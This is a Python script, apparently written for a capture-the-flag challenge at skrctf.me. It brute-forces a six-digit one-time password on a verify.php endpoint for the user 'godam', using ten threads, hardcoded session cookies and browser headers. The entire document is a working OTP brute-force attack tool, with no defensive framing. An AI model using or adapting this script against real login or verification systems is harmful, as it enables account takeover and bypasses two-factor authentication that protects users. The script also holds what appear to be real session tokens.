import requests
import random
import threading
from queue import Queue

# Configuration
url = 'http://skrctf.me:4999/verify.php'
cookies = {
    'session': 'aa9366ab-f573-45b6-9122-d931f7d9c994',
    'PHPSESSID': 'ah95rseefqo0d0i1eb5aann3ef',
}
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en,zh-CN;q=0.9,zh;q=0.8,th;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'DNT': '1',
    'Origin': 'http://skrctf.me:4999',
    'Referer': 'http://skrctf.me:4999/verify.php?username=godam',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
}
params = {'username': 'godam'}

# Queue for OTPs
otp_queue = Queue()

# Function to send a request
def attempt_otp():
    while not otp_queue.empty():
        otp = otp_queue.get()
        data = {'otp': otp}
        try:
            response = requests.post(url, params=params, cookies=cookies, headers=headers, data=data, verify=False)
            if "Verified" in response.text:  # Adjust success detection logic based on response
                print(f"Valid OTP found: {otp}")
                # Stop all other threads
                while not otp_queue.empty():
                    otp_queue.get_nowait()
        except Exception as e:
            print(f"Error for OTP {otp}: {e}")
        finally:
            otp_queue.task_done()

# Generate random 6-digit OTPs and populate the queue
def generate_otps(count=1000):
    for _ in range(count):
        otp = f"{random.randint(0, 999999):06}"  # Generate a zero-padded 6-digit number
        otp_queue.put(otp)

# Main function to run threads
def main():
    generate_otps(count=1000000)  # Adjust the number of OTPs to test
    threads = []
    for _ in range(10):  # Number of threads
        t = threading.Thread(target=attempt_otp)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
